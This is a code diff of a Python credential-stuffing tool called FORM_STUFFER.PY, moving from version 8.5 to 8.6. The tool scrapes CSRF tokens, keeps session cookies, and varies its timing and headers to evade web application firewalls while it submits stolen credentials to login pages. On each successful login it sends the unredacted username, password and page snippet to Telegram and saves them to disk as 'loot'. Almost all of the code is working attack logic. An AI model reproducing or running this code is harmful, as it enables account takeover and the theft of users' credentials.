@@ -1,20 +1,22 @@
 #!/usr/bin/env python3
 """
-FORM_STUFFER.PY v8.5 — Automated CSRF-Aware Credential Stuffing & Login Module (WAF Hardened)
+FORM_STUFFER.PY v8.6 — Automated CSRF-Aware Credential Stuffing & Login Module (Elite Red Team Adversarial Edition)
 Features:
-- Dynamically scrapes live CSRF tokens (_token) from target login pages
-- Maintains session state & cookie jars across GET/POST cycles with behavioral jitter & WAF evasion
+- Dynamically scrapes live CSRF tokens (_token) from target login pages with BeautifulSoup
+- Maintains session state & cookie jars across GET/POST cycles with Poisson timing jitter & WAF evasion
 - Submits valid or stuffed credentials against target login endpoints using randomized header hints
-- Automatically routes successful authentication states to the centralized session loot reporter and Telegram
+- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic cryptographic integrity hashing
+- Real-time unredacted Telegram notification dispatch and zero-delay telemetry broadcasting
 """
 import sys
 import re
 import httpx
 import asyncio
+import hashlib
 from bs4 import BeautifulSoup
 from urllib.parse import urlsplit
 
-# Import centralized framework telemetry, immutable loot persistence, Telegram notifier, and behavioral mimicry
+# Import centralized framework telemetry, immutable loot persistence, behavioral mimicry, and Telegram notifier
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
 from modules.telegram_notifier import send_telegram_alert
@@ -24,14 +26,23 @@ def log(msg, color="\033[92m"):
     sys.stdout.write(f"{color}{msg}\033[0m\n")
     sys.stdout.flush()
 
+async def broadcast_tg_alert_async(loot_type, details):
+    try:
+        await send_telegram_alert(loot_type, details)
+    except Exception:
+        pass
+
 def broadcast_tg_alert_sync(loot_type, details):
     """Helper to non-blockingly fire Telegram alerts from synchronous form stuffer functions."""
     try:
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert(loot_type, details))
+        if loop.is_running():
+            loop.create_task(broadcast_tg_alert_async(loot_type, details))
+        else:
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
     except RuntimeError:
         try:
-            asyncio.run(send_telegram_alert(loot_type, details))
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
         except Exception:
             pass
 
@@ -44,7 +55,7 @@ def execute_form_stuffing(target_url, username, password, login_path="/user/logi
         base_url += f":{parsed.port}"
     
     login_url = f"{base_url}{login_path}"
-    log(f"\n[***] FORM STUFFER: Targeting login portal at {login_url} [***]", "\033[95m")
+    log(f"\n[***] FORM STUFFER: Targeting login portal at {login_url} (WAF Hardened) [***]", "\033[95m")
 
     headers = {
         "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
@@ -118,18 +129,18 @@ def execute_form_stuffing(target_url, username, password, login_path="/user/logi
             if status in (200, 302) and not is_login_page and not is_spa_shell and has_dashboard_indicators:
                 log(f"[!!!] SUCCESS! Credential stuffing successful! Access confirmed [HTTP {status}] [!!!]", "\033[91m")
                 
+                loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
                 loot_payload = {
                     "target": login_url,
                     "username": username,
                     "password": password,
                     "status": status,
+                    "integrity_hash": loot_hash,
                     "response_snippet": body[:400]
                 }
 
-                # BROADCAST UNREDACTED CREDENTIAL STUFFING LOOT STRAIGHT TO TELEGRAM
+                # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
                 broadcast_tg_alert_sync("Credential Stuffing Success", loot_payload)
-
-                # STREAM TELEMETRY & PERSIST TO DISK VIA CENTRALIZED FRAMEWORK LOGGER
                 stream_proof("FORM_STUFFER_SUCCESS", login_url, {"username": username}, body[:300], {"status": status})
                 save_session_loot(
                     target=base_url,
